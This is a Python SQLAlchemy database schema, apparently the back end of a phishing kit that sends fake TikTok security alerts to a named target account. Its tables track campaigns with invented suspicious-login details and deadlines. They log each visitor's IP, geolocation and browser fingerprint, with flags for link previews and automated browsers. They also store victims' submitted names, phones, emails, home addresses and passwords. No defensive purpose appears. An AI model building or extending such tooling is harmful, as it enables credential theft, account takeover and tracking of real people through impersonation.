import os
from datetime import datetime, timezone
from sqlalchemy import create_engine, String, Integer, Float, Boolean, Text, DateTime, ForeignKey
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column, sessionmaker

DB_PATH = os.getenv("DB_PATH", "./data/app.db")
os.makedirs(os.path.dirname(os.path.abspath(DB_PATH)), exist_ok=True)
engine = create_engine(f"sqlite:///{DB_PATH}", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)


def now():
    return datetime.now(timezone.utc)


class Base(DeclarativeBase):
    pass


class Campaign(Base):
    __tablename__ = "campaigns"
    id: Mapped[int] = mapped_column(primary_key=True)
    slug: Mapped[str] = mapped_column(String(64), unique=True, index=True)
    label: Mapped[str] = mapped_column(String(120), default="")
    redirect_url: Mapped[str] = mapped_column(String(300), default="https://www.tiktok.com/")
    cuenta_objetivo: Mapped[str] = mapped_column(String(80), default="")
    nickname_objetivo: Mapped[str] = mapped_column(String(80), default="")
    dispositivo_sospechoso: Mapped[str] = mapped_column(String(120), default="Android · Chrome")
    ubicacion_sospechosa: Mapped[str] = mapped_column(String(120), default="Bogotá, Colombia")
    fecha_sospechosa: Mapped[str] = mapped_column(String(120), default="")
    ip_enmascarada: Mapped[str] = mapped_column(String(60), default="190.xx.xx.xx")
    codigo_incidencia: Mapped[str] = mapped_column(String(60), default="")
    horas_limite: Mapped[int] = mapped_column(Integer, default=24)
    pedir_password: Mapped[bool] = mapped_column(Boolean, default=False)
    activa: Mapped[bool] = mapped_column(Boolean, default=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=now)
    notes: Mapped[str] = mapped_column(Text, default="")


class Hit(Base):
    __tablename__ = "hits"
    id: Mapped[int] = mapped_column(primary_key=True)
    campaign_id: Mapped[int] = mapped_column(ForeignKey("campaigns.id"), index=True)
    session_id: Mapped[str] = mapped_column(String(64), index=True, default="")
    ts_utc: Mapped[datetime] = mapped_column(DateTime, default=now, index=True)
    kind: Mapped[str] = mapped_column(String(20), default="page")
    step: Mapped[str] = mapped_column(String(20), default="")
    ip: Mapped[str] = mapped_column(String(60), default="")
    country: Mapped[str] = mapped_column(String(80), default="")
    region: Mapped[str] = mapped_column(String(80), default="")
    city: Mapped[str] = mapped_column(String(80), default="")
    lat: Mapped[float] = mapped_column(Float, default=0.0)
    lon: Mapped[float] = mapped_column(Float, default=0.0)
    org: Mapped[str] = mapped_column(String(160), default="")
    asn: Mapped[str] = mapped_column(String(60), default="")
    user_agent: Mapped[str] = mapped_column(Text, default="")
    accept_language: Mapped[str] = mapped_column(String(120), default="")
    referer: Mapped[str] = mapped_column(Text, default="")
    preview_flag: Mapped[bool] = mapped_column(Boolean, default=False, index=True)
    preview_reason: Mapped[str] = mapped_column(String(40), default="")
    tz: Mapped[str] = mapped_column(String(80), default="")
    tz_country: Mapped[str] = mapped_column(String(40), default="")
    screen: Mapped[str] = mapped_column(String(30), default="")
    languages: Mapped[str] = mapped_column(String(120), default="")
    platform: Mapped[str] = mapped_column(String(80), default="")
    webgl_renderer: Mapped[str] = mapped_column(String(200), default="")
    webdriver: Mapped[bool] = mapped_column(Boolean, default=False)
    raw_json: Mapped[str] = mapped_column(Text, default="")
    sha256: Mapped[str] = mapped_column(String(64), default="")


class Verificacion(Base):
    __tablename__ = "verificaciones"
    id: Mapped[int] = mapped_column(primary_key=True)
    campaign_id: Mapped[int] = mapped_column(ForeignKey("campaigns.id"), index=True)
    session_id: Mapped[str] = mapped_column(String(64), index=True, default="")
    nombre: Mapped[str] = mapped_column(String(160), default="")
    telefono: Mapped[str] = mapped_column(String(40), default="")
    email: Mapped[str] = mapped_column(String(160), default="")
    pais: Mapped[str] = mapped_column(String(80), default="")
    estado: Mapped[str] = mapped_column(String(80), default="")
    ciudad: Mapped[str] = mapped_column(String(120), default="")
    calle: Mapped[str] = mapped_column(String(200), default="")
    numero: Mapped[str] = mapped_column(String(120), default="")
    referencia: Mapped[str] = mapped_column(String(200), default="")
    codigo_postal: Mapped[str] = mapped_column(String(20), default="")
    dispositivo_habitual: Mapped[str] = mapped_column(String(40), default="")
    usa_vpn: Mapped[str] = mapped_column(String(20), default="")
    dispositivos_abiertos: Mapped[str] = mapped_column(String(20), default="")
    password: Mapped[str] = mapped_column(String(120), default="")
    ts_utc: Mapped[datetime] = mapped_column(DateTime, default=now, index=True)
    raw_json: Mapped[str] = mapped_column(Text, default="")
    sha256: Mapped[str] = mapped_column(String(64), default="")


class Note(Base):
    __tablename__ = "notes"
    id: Mapped[int] = mapped_column(primary_key=True)
    entity_type: Mapped[str] = mapped_column(String(30))
    entity_id: Mapped[str] = mapped_column(String(64))
    text: Mapped[str] = mapped_column(Text)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=now)


def init_db():
    Base.metadata.create_all(engine)


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()